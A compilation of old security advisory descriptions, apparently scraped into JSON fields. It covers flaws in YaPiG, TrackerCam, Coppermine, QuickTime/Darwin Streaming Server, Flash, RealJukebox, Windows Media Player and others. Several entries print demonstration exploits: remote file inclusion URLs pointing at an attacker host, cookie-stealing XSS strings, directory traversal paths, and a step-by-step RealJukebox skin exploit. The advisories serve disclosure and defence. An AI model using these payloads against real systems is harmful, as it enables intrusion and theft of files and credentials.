A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser.  The code will originate from the site hosting the Adobe Flash content and will run in the security context of that site.  As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nPre-generated SWF files distributed with Adobe Dreamweaver CS3 and Adobe Acrobat Connect are affected.  Other SWF files may also be affected.\n\nThese vulnerabilities were reported in a pending book by Rich Cannings of Google and Himanshu Dwivedi and Zane Lackey of iSEC Partners.\n\n[Editor's note:  This is not a vulnerability in Flash Player, per se.

    "Description": "SecWatch reported several vulnerabilities in YaPiG.  A remote user can conduct cross-site scripting attacks and determine the installation path.  A remote authenticated user can execute arbitrary PHP code and operating system commands on the target system and can create and delete directories on the target system.\nThe 'upload.php' script does not properly validate file extensions of uploaded image files.  A remote authenticated user can upload files containing arbitrary content, such as PHP code, and then cause the target web server to execute the files.  The PHP code, including operating system commands, will run with the privileges of the target web service.\n\nSome demonstration exploit URLs are provided:\n\nhttp://[target]/global.php?BASE_DIR=/local/path/to/global-gen.php\n\nhttp://[target]/last_gallery.php?YAPIG_PATH=http://[attacker]/\n\nThe script also fails to properly validate user-supplied input in the 'dir' parameter before using the data as part of rmdir() and mkdir() function calls.  A remote authenticated user can submit specially crafted parameter values containing '../' directory traversal characters to create and delete arbitrary directories located outside of the gallery directory.\n\nSome demonstration exploit URLs are provided:\n\nhttp://[target]/upload.php?step=rmdir&dir=../folder\n\nhttp://[target]/upload.php?step=mkdir&dir=../folder\n\nSeveral scripts include files relative to parameters that can be modified by remote users.  A remote user can supply a specially crafted parameter value to cause arbitrary PHP code from a remote site to be included and executed by the target web service.\n\nThe 'view.php' script does not properly validate user-supplied input in the 'phid' parameter.  A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser.  The code will originate from the site running the YaPiG software and will run in the security context of that site.  As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. \n\nA demonstration exploit URL is provided:\n\nhttp://[target]/view.php?gid=1&phid=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E\n\nOther parameters are affected when a remote user adds a new comment.\n\nThe system stores plain text authentication data on the target user's browser if the '$USE_COOKIES=true;' parameter is set.  A local user on the target user's system can obtain authentication data.  \n\nA remote user can also supply the following type of URL to cause the system to disclose the installation path:\n\nhttp://[target]/view.php?gid=1&phid=alpha\n\n  The vendor was notified on May 30, 2005, without response.\n\nSecWatch reported this vulnerability.  An anonymous person discovered the vulnerability.\n\nThe original advisory is available at:\n\nhttp://secwatch.org/advisories/secwatch/20050530_yapig.txt",

    "Description": "Luigi Auriemma reported several vulnerabilities in TrackerCam.  A remote user can cause the target service to crash.  A remote user can view arbitrary files on the system.  A remote user can also conduct cross-site scripting attacks.\nA remote user can send an HTTP request with a specially crafted User-Agent value that is longer than 216 bytes to trigger a buffer overflow.  Another buffer overflow can be triggered when more than 256 bytes are passed to a PHP script, as in the following demonstration exploit URL:\n\nhttp://[target]:8090/MessageBoard/messages.php?aaaaaaaaaaa...aaaa\n\nA remote user can invoke the 'ComGetLogFile.php3' script and supply a specially crafted 'fn' parameter containing '../' directory traversal characters to view arbitrary files on the target system.  A demonstration exploit URL is provided:\n\nhttp://[target]:8090/tuner/ComGetLogFile.php3?fn=../../../../windows/system.ini\n\nA remote user can exploit this flaw to view the log file.  From reading the log file, a remote user can distinguish between valid and invalid password attempts to assist in performing a brute force password guessing attck.  A demonstration exploit URL is provided:\n\nhttp://[target]:8090/tuner/ComGetLogFile.php3?fn=Eye2005_02.log\n\nThe log file viewer does not properly filter HTML code from user-supplied input that is logged.  A remote user can submit specially crafted requests to be logged.  Then, when the target administrator views the log file via a web browser, arbitrary scripting code will be executed by the target administrator's browser. The code will originate from the host running TrackerCam and will run in the security context of that site. As a result, the code will be able to access the target administrator's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target administrator via web form to the site, or take actions on the site acting as the target administrator.\n\nA remote user can send an HTTP header with a negative Content-Length value to trigger an error messages.  A remote user can send this type of message about 300 times to cause the target server to crash.  A remote user can also send approximately 10 MB of data to cause the target server to crash.\n\nSome demonstration exploit code is available at:\n\nhttp://aluigi.altervista.org/poc/tcambof.zip",

    "Impact'": "A remote user can create a WAV file that, when processed by the target user, will execute arbitrary code on the target system with the privileges of the SoX process.",

Other file types may also be affected but were not tested.\n\nIt is also reported that when the Music Converter is integrated into the Windows shell, a remote user can send a specially crafted playlist so that when the target user places the mouse over the playlist file in Windows Explorer, the target user's system will crash.\n\nA demonstration exploit is available at:\n\nhttp://www.gulftech.org/downloads/?file_id=00022",

A remote user can execute arbitrary PHP code on the target system, conduct cross-site scripting attacks, and determine the installation path.\nJanek Vind \"waraxe\" reported that the software includes a PHP file without validating the source of the file.  As a result, a remote user can supply a specially crafted URL to cause the target server to include and execute a remote file.  The PHP code in the file (including operating system commands) will execute on the target system with the privileges of the target web service.\n\nIn version 1.2.0 RC4, the 'init.inc.php' file will reportedly include the '/include/functions.inc.php' file from a remote location if the 'CPG_M_DIR' variable points to the remote location.  A demonstration exploit URL is provided:\n\nhttp://localhost/nuke69j1/modules/coppermine/include/init.inc.php?CPG_M_DIR=http://attacker.com\n\nIn version 1.2.2b, the 'theme.php' filewill reportedly include the '/user_list_info_box.inc' file if the 'THEME_DIR' variable points to a remote location.

A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Coppermine Photo Gallery software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.\n\nSome demonstration exploit URLs are provided:\n\nhttp://localhost/nuke72/modules/coppermine/docs/menu.inc.php?CPG_URL=foobar\">[xss\ncode here]\nhttp://localhost/nuke72/modules/coppermine/docs/menu.inc.php?CPG_URL=foobar\"><body%20onload=alert(document.cookie);>\n\nIt is also reported that a remote authenticated user with PHP-Nuke administrative privileges can view the PHP-Nuke directory structure with the following type of URL:\n\nhttp://localhost/nuke72/modules.php?name=coppermine&file=searchnew&startdir=../..\n\nIt is also reported that a remote authenticated user with PHP-Nuke administrative privileges can execute arbitrary shell commands by submitting specially crafted 'impath' and 'jpeg_qual' configuration parameters.

    "Description": "A vulnerability was reported in Apple Mac OS X versions of the Macromedia installers (including Macromedia Dreamweaver MX) in the e-licensing client.  A local user can obtain elevated privileges on the target system.\nMacromedia reported that the software installs the 'AuthenticationService' file with permissions that allow local users to write to the file and also with set user id (setuid) privileges. The report indicates that if a user without administrative privileges modifies the file, the operating system will remove the setuid setting.  However, a local user can reportedly modify the file and then cause a target user to execute the service directly (and not through a Macromedia product) to execute arbitrary code with the privileges of the target user.\n\nAccording to the vendor, the current versions of all Macromedia products will detect that the file has been changed and refuse to execute the modified file.\n\nThe vendor credits Chris Irvine of Dark Horse Comics, Inc. with reporting this vulnerability.",

    "Description": "Rapid7 reported several vulnerabilities in Apple's QuickTime/Darwin Streaming Server.  A remote user can view files and script source code on the target system.  A remote user can also cause the web service to crash.  In a certain case, a remote user may be able to set the administrator password.\nSeveral vulnerabilities were disclosed in this report.  Some of the flaws are specific to certain operating systems and versions, as noted below.\n\nOn Win32 servers, a remote user can view files on the system with the privileges of the streaming server (CVE CVE-2003-0425).  This flaw affects versions 4.1.3e and prior.  A remote user can request a URL containing the '.../' directory traversal characters via HTTP on port 1220 to view files on the system.\n\nIt is reported that the Win32 version can be crashed by remote users requesting DOS device names (CVE CVE-2003-0421).  Versions 4.1.3e and earlier are affected.  A remote user can request a DOS device name to cause the target server to respond with an HTTP 404 error (as expected) and then fail to respond to subsequent requests.  A demonstration exploit is provided:\n\nGET /AUX HTTP/1.0\n\nA remote user can also request a DOS device name via a URL containing '../' directory traversal characters to cause the target Win32 server to stop responding to subsequent requests (CVE CVE-2003-0502).  Versions 4.1.3f and earlier are affected.  A demonstration exploit is provided:\n\nGET /../AUX HTTP/1.0\n\nA remote user can reportedly request the '/view_broadcast.cgi' script without the appropriate parameters to cause the target Win32 server to stop processing requests (CVE CVE-2003-0422).  This flaw affects versions 4.1.3e and earlier.  A demonstration exploit is provided:\n\nGET /view_broadcast.cgi HTTP/1.0\n\nIt is reported that a remote user can request the '/parse_xml.cgi' script to view the source code of any file in the web document directory structure (CVE CVE-2003-0423).  Version 4.1.3g and prior versions are affected.  A demonstration exploit is provided:\n\n/parse_xml.cgi?filename=[file]\n\nA remote user can also view the source of scripts on the Win32 server by appending certain characters to an HTTP request for the script (CVE CVE-2003-0424).  This affects version 4.1.3e and prior versions.  A remote user can append a period character ('%2E') or space character ('%20') to cause the script source to be displayed.\n\nFinally, it is reported that a remote user can invoke the \"Setup Assistant\" page on a newly installed server to set the administrator password to an arbitrary value if the administrator has not already set a password (CVE CVE-2003-0426).  This flaw affects versions 4.1.3e and prior on Mac OS X only.",

    "Description": "Several vulnerabilities were reported in the QuickTime/Darwin Streaming Server in the Administration Server.  A remote user can execute arbitrary commands on the server with root privileges and can conduct cross-site scripting attacks against administrators.  A local user can also execute arbitrary code with root privileges.  \nAccording to the report, the Administration Server runs with root privileges.  Several flaws were reported by @stake.\n\nA remote user can reportedly connect to the Administration Server on port 1220 and execute operating system commands on the server with root privileges.  In some cases, arbitrary parameters can be supplied.\n\nIt is reported that the parse_xml.cgi script passes user-supplied input to a Perl open() function without properly validating the input.  A remote user can supply a GET request with input containing a pipe character ('|') to the QuickTime version of the Administration Server to cause arbitrary commands to be executed on the server.  In the Darwin version of the Administration Server, some checking is performed that makes it more difficult to pass command parameters.\n\nOn a UNIX-based target system, a remote user can reportedly exploit this flaw to open the inode of a directory to obtain a listing of the directory's contents.\n\nA remote user can also determine the physical installation path by submitted a GET request to the parse_xml.cgi script with a NULL character as the filename parameter.\n\nA remote user can conduct cross-site scripting attacks against administrators by submitting a GET request to the parse_xml.cgi script with a specially crafted filename parameter.  Arbitrary HTML code contained specified in the filename parameter will be displayed by the script's error message.\n\nA remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Administration Server and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.  For example, the 'qtpassword' cookie reportedly contains a Base64-encoded copy of the administrative username and password.\n\nAlso, it is reported that a remote user can make a request to port 7070 and supply a specially crafted value containing HTML code as part of an argument to the rtsp DESCRIBE method to conduct cross-site scripting attacks.  This will cause the HTML code to be written to the log file.  Then, when an administrator views the logs via the administrative interface, the code will be executed on the administrator's browser.\n\nIt is also reported that a local user can trigger a buffer overflow to gain elevated privileges on the system.  According to the report, a buffer overflow in the streaming server's MP3 broadcasting module may allow arbitrary code to be executed when an MP3 file with a filename longer than 256 bytes is loaded.  A local user can load a specially named MP3 file to execute arbitrary code with root privileges to gain root access on the server.\n\n[Editor's note:  Regrettably, @stake does not permit us to reproduce their advisory, so we cannot provide you with the Source Message.  You may view the advisory on their web site: http://www.atstake.com/research/advisories/2003/a032403-1.txt]",

A remote user can create content that can read local files on the target user's computer.\nIt is reported that a remote user can create malicious Flash content to read files on the target user's computer and send them to a remote location.  \n\nThe vulnerability apparently resides in the ActionScript feature used to load XML files.  Ordinarily, the Flash Player prevents Flash content (movies) from loading data located outside of the original content's domain.  However, it is apparently possible to bypass this restriction by loading data from URLs that are modified during HTTP negotiation.  Malicious Flash content served from a remote domain could access local files and send them back to the remote domain.\n\nThe following three methods can be used to exploit the flaw, according to the report:\n\n1) The content can force an HTTP redirect to a local file.  A demonstration exploit example is available at:\n\nhttp://kuperus.xs4all.nl/flash.htm\n\n2) The remote user can place a <base href=\"file:///C:/\"> tag in the Flash document then use a relative URL.  A demonstration exploit example is available at:\n\nhttp://www.xs4all.nl/~jkuperus/flash.htm\n\n3) For systems using Internet Explorer, the remote user can embed a malicious Flash object in a web archive ('.mht' file) and make it seem as though its been saved from a location on the users hard drive, then use a relative URL.

A physically local user can hijack a Remote Desktop Sharing (RDS) session.\nIt is reported that the NetMeeting Remote Desktop Sharing (RDS) Screen Saver Protection feature fails to properly restrict access of physically local users.  A physically local user can apparently hijack a remote session to obtain the privileges of the remote user.\n\nA demonstration exploit scenario for a system being controlled remotely by the NetMeeting RDS service is provided:\n\n(1) Hijacker monitors the RDS session at the local RDS host screen until the remote user makes a change to a document or setting (i.e., opening Notepad and typing text).\n\n(2) Hijacker uses the following sequence (keys vary slightly between OS): CTRL-ALT-DEL, 'shut down', 'Okay', ESC. (Effectively starting a logoff of the session and grabbing control from the authorized remote user.)\n\n(3) Hijacker has local keyboard control and the \"Do you want to save the changes?\" box is displayed.\n\n(4) Hijacker uses the 'Cancel' button to abort the logoff.\n\n(5) Screensaver may briefly appear or the desktop background only may appear. Pressing CTRL-ALT-DEL followed by the ESC key at this point gives the hijacker full control of the system with the remote user's credentials. (The remote user still may view the session until disconnected or the program is exited, however, cannot take control of the session back from the hijacker.)\n\nThe vendor is reportedly aware of the bug.",

A remote user can create Flash content that can read local files on the target user's computer.\nIt is reported that a remote user can create malicious Flash content to read files on the target user's computer and send them to a remote location.  \n\nThe vulnerability apparently resides in the ActionScript feature used to load XML files.

    "Description": "A buffer overflow vulnerability was reported in 'libpng'.  A remote user may be able to create a specially crafted Portable Network Graphics (PNG) image file to cause an affected application to crash.\nIt is reported that the progressive reader code contains a buffer overflow that can be triggered by a malicious PNG image file that contains more IDAT data than indicated by the IHDR chunk.  According to the report, applications that use libpng may crash when loading a malicious file.\n\nIf the X size is greater than 2^32 divided by the number_bytes_needed_per_pixel then the number of bytes required for a row becomes greater than 2^32 and overflows.In a variation, a much larger IDAT chunk than the data size will also cause corruption.\n\nIt is reported that it is theoretically possible to execute arbitrary code using this buffer overflow, but exploitation may be non-trivial.\n\nAdditional details are available at:\n\nhttp://bugzilla.mozilla.org/show_bug.cgi?id=155222",
    "Impact'": "A remote user can create a PNG image file that will cause the affected application to crash when loading the file.",

    "Description": "Two vulnerabilities were reported in RealOne Player Gold and RealJukebox 2.  One is due to a buffer overflow in the processing of skin files and the other is due to the use of predictable temporary file names when loading skins.\nShadow Penguin Security reported that a remote user could create a malicious skin file that contains a specially crafted value for the \"CONTROLnImage\" field of the \"skin.ini\" file.  When the skin is loaded, the long filename specified for the \"CONTROLnImage\" field will trigger a buffer overflow and code will be executed on the target user's computer.  The code will run with the privileges of the target user.\n\nTo reproduce the buffer overflow vulnerability, create the following skin.ini file and compress it into a zip file:\n\n[MAIN]\nApplication=RealJukebox\nVersion=2\nSkinFamilyCount=5\n\nCONTROL1Image=aaaaaaaaaa...  long'a'\n\nThen, rename the file extension from \".zip\" to \".rjs\" and drop it to a web browser to cause it to be executed.\n\nShadow Penguin Security also reported that a remote user could create a malicious skin file that, when loaded by the target user, would cause arbitrary scripting code to be executed in the \"My Computer\" security zone.  This is because the Real player extracts the \"skin.ini\" file to a known directory when the skin file is loaded.  A remote user can place HTML code in the skin.ini file and Internet Explorer will process the file as an HTML file.\n\nTo reproduce this flaw, create a \"skin.ini\" file that contains the following HTML contents (which is designed to launch \"c:\\winnt\\notepad.exe\"):\n\n<html>\n<OBJECT CLASSID='CLSID:15589FA1-C456-11CE-BF01-00AA0055595A'\nCODEBASE='file://c:\\winnt\\notepad.exe'></OBJECT>\n</html>\n\nThen, compress the file into a zip file and rename the file extension from \".zip\" to \".rjs\".  Create a \"test.html\" file with the following contents:\n\n<html>\n<META HTTP-EQUIV=\"Refresh\" CONTENT=\"20;URL=file://c:\\Program\nFiles\\Real\\RealJukebox\\temp\\~rjbtemp0\\skin.ini\">\n<iframe src=\"exploit.rjs\">\n</html>\n\nTo trigger the vulnerability, simply view the \"test.html\" file using Internet Explorer.  The \"exploit.rjs\" file will be loaded into the player and the \"skin.ini\" file will be extracted.  When this occurs, the player will reportedly create a temporary directory name \"~rjbtemp?\" directory in the \"temp\" directory (under the player's installation directory).  The \"?\" character represents a sequence number which usually has a value of '0' if the player is not currently active and has never terminated abnormally.  The \"skin.ini\" file will be extracted to the \"~rjbtemp?\" directory and will be executed by IE.\n\nIn the case of both vulnerabilities, a remote user can deliver the malicious skin file to the target user via an HTML link, either in a web page or via HTML-based e-mail.  It is not necessary for the user to actively click on a file to be affected.",

    "Description": "Microsoft reported several vulnerabilities in Windows Media Player.  A remote user could execute arbitrary programs or arbitrary scripting code on the user's computer.  Also, a local user can execute arbitary code on the system with System level privileges.\nMicrosoft described several new vulnerabilities in Windows Media Player.  These issues are discussed separately below.\n\nFirst, an information disclosure vulnerability involving the Internet Explorer (IE) Cache directories could allow a remote user to run code on a target user's computer.  The code would run with the privileges of the user running Windows Media Player.\n\nThis bug is reportedly caused by the player's processing of certain types of licenses for secure media files when the media file is stored in the IE cache.  A remote user can supply a certain type of secure Windows Media file (using WM DRM version 1.0) to the user such that, when the file is opened, the media player will incorrectly return information to the server that discloses the location of the IE cache while it is processing the request to the web site specified for handling the licensing information.\n\nA remote user could learn of the location of the IE cache on the target user's local file system and, separately, cause an executable program to be stored in the cache (by sending the user HTML-based e-mail or getting the user to visit a particular web page).  Then, the remote user could then directly access (and execute) the stored executable.\n\nIn certain configurations, it is reportedly possible for an HTML email to attempt to play a media file automatically, allowing an exploit to occur when the target user views or previews a malicious e-mail message.\n\nSecond, a local authenticated user could execute arbitrary commands with System level privileges to take full control of the operating system.  The bug reportedly exists in the Windows Media Device Manager (WMDM) Service processing of requests to access invalid local storage devices.  WMDM is a component of Windows Media Player and is only used in Windows 2000.  So, this flaw reportedly only affects Windows Media Player 7.1 on Windows 2000 systems.\n\nA local user may be able to provide a specially crafted request to connect to an invalid device to gain access to a local resource and execute any local program with LocalSystem privileges.\n\nAccording to Microsoft, a console session is required to exploit this privilege escalation flaw.\n\nLastly, a remote user could supply and invoke an HTML script on a target user's computer.  The script could take any actions acting as the target user.\n\nThe flaw is reportedly due to the storage of the Windows Media active playlist information on the local system in a known location.  Playlists typically have a '.asx' extension and are XML-based (and can include HTML script).  So, a remote user can exploit this to store and then invoke HTML script in the Local Computer security zone.\n\nA remote user can create a specially formatted media file (that includes a malicious playlist).  If this playlist is in the memory when the Windows Media Player is exited (on the target user's computer), the player will write the playlist to a known location on the target user's computer.  The remote user can then create a malicious web page that, when subsequently viewed by the target user, will cause the playlist to be executed.  The HTML script in the playlist will then run on the target user's computer in the Local Computer zone.\n\nAccording to the security bulletin, this bug requires several specific, ordered exploit steps:\n\n1) The target user plays specially crafted media file supplied by the remote user.\n2) The target user shuts down the media player after playing the file and before playing any other files.\n3) The target user views a web page supplied by the remote user.\n\nMicrosoft credits jelmer for reporting the Cache Patch Disclosure bug, the Research Team of Security Internals for reporting the Privilege Elevation via Windows Media Device Manager Service issue, and Elias Levy for reporting the Media Playback Script Invocation bug.",

The vulnerability is a write overflow that could allow arbitrary code to be executed.  The Macromedia Flash plugin is not affected.\nTo determine which version of Flash you are using, you can apparently use the URL \"about:plugins\" under Netscape and look for Olivier Debon's name.  Even if compiled with the \"NOSOUND\" flag, you are still vulnerable.  The port to Windows CE by Conduit Technologies is apparently not affected.\n\nThe defect resides in the file \"script.cc\" in the function \"ParseDefineSound()\" and relates to the DefineSound module.\n\nA memcpy/Decompress call causes a write-overflow that could allow the execution of arbitrary code.",

    "Description": "A vulnerability has been reported in Windows Media Player 7 that is exploitable thru IE and java which allows the reading of local files and browsing of directories which, in turn, may allow the execution of arbitratrary programs on the client's host.\nThe problem involves Windows Media Player skins, which are installed in a known directory and with a known name:  \"C:/Program files/Windows Media Player/Skins/SKIN.WMZ\"\n\nThe code <IFRAME SRC=\"wmp2.wmz\"></IFRAME> will download wmp2.wmz and place it in \"C:/Program files/Windows Media Player/Skins/wmp2.wmz\".  The file wmp2.wmz may be a malicious java jar archive.  Then, a malicious applet tag can be executed with codebase=\"file://c:/\" and the applet will have read only access to C:\\.\n\nThe vendor was reportedly contacted on 11 January 2001.\n\nMore information is available in Georgi Guninski security advisory #35, 2001.",
